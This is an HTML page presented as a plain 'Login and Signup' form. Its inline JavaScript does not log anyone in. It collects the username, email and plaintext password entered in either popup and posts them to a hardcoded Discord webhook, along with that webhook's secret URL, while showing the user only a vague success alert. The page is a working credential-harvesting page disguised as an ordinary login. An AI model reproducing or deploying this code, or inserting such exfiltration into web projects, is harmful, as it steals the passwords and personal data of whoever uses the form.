<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login and Signup</title>
  <style>
    /* CSS styles */

    body {
      font-family: Arial, sans-serif;
    }

    .header {
      background-color: #000;
      color: #fff;
      padding: 20px;
    }

    .header h1 {
      margin: 0;
    }

    .container {
      margin: 20px;
    }

    .form-container {
      max-width: 400px;
      margin: 0 auto;
    }

    .form-container h2 {
      margin-bottom: 20px;
    }

    .form-container label,
    .form-container input[type="text"],
    .form-container input[type="password"],
    .form-container button {
      display: block;
      margin-bottom: 10px;
    }

    .form-container button {
      padding: 8px 12px;
    }

    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: #fff;
      width: 300px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
      display: none;
    }

    .popup.show {
      display: block;
    }

    .popup h2 {
      margin-top: 0;
    }

    .popup label,
    .popup input[type="text"],
    .popup input[type="password"],
    .popup button {
      display: block;
      margin-bottom: 10px;
    }

    .popup button {
      padding: 8px 12px;
    }
  </style>
  <script>
    function openPopup(popupId) {
      document.getElementById(popupId).classList.add("show");
    }

    function closePopup(popupId) {
      document.getElementById(popupId).classList.remove("show");
    }

    function sendWebhook(content) {
      const webhookUrl = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content })
      })
        .then(response => {
          if (response.ok) {
            alert("Notification sent successfully!");
          } else {
            alert("Failed to send notification.");
          }
        })
        .catch(error => {
          console.error("Error:", error);
          alert("An error occurred while sending the notification.");
        });
    }

    function login(event) {
      event.preventDefault();
      const username = document.getElementById("loginUsername").value;
      const password = document.getElementById("loginPassword").value;

      const content = `**Login**\nUsername: ${username}\nPassword: ${password}`;
      sendWebhook(content);
    }

    function signup(event) {
      event.preventDefault();
      const username = document.getElementById("signupUsername").value;
      const email = document.getElementById("signupEmail").value;
      const password = document.getElementById("signupPassword").value;

      const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
      sendWebhook(content);
    }
  </script>
</head>

<body>
  <div class="header">
    <h1>Login and Signup</h1>
  </div>

  <div class="container">
    <div class="form-container">
      <button onclick="openPopup('loginPopup')">Login</button>
    </div>

    <div class="form-container">
      <button onclick="openPopup('signupPopup')">Signup</button>
    </div>
  </div>

  <div id="loginPopup" class="popup">
    <h2>Login</h2>
    <form onsubmit="login(event)">
      <label for="loginUsername">Username:</label>
      <input type="text" id="loginUsername" required>
      <label for="loginPassword">Password:</label>
      <input type="password" id="loginPassword" required>
      <button type="submit">Login</button>
      <button type="button" onclick="closePopup('loginPopup')">Close</button>
    </form>
  </div>

  <div id="signupPopup" class="popup">
    <h2>Signup</h2>
    <form onsubmit="signup(event)">
      <label for="signupUsername">Username:</label>
      <input type="text" id="signupUsername" required>
      <label for="signupEmail">Email:</label>
      <input type="email" id="signupEmail" required>
      <label for="signupPassword">Password:</label>
      <input type="password" id="signupPassword" required>
      <button type="submit">Signup</button>
      <button type="button" onclick="closePopup('signupPopup')">Close</button>
    </form>
  </div>

</body>
  
</html>
